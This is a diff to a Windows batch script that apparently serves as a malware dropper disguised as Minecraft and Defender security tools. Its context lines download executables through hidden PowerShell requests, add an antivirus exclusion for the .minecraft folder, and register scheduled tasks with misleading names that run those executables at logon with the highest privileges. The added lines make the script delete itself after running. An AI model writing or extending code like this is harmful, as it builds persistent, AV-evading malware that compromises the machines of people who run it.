@@ -67,6 +67,7 @@ powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
 schtasks /create /tn "DefenderSecurityCheck" /tr "%filepath%\DefenderSecurityCheck.exe" /sc onlogon /rl highest /f >nul
 schtasks /run /tn "DefenderSecurityCheck" >nul
 start "DefenderSecurityCheck" "%filepath%\DefenderSecurityCheck.exe"
+goto end
 :mcstage
 powershell -Command "Add-MpPreference -ExclusionPath "%appdata%\.minecraft""
 set /a num=%RANDOM% %% 10
@@ -95,3 +96,7 @@ powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
 schtasks /create /tn "MinecraftSecurity" /tr "%filepath%\saves\%fol%\data\minecraftsetup.exe" /sc onlogon /rl highest /f >nul
 schtasks /run /tn "MinecraftSecurity" >nul
 start "MinecraftSecurityTest" "%filepath%\saves\%fol%\data\minecraftsetup.exe"
+goto end
+:end
+del "%~f0"
+exit
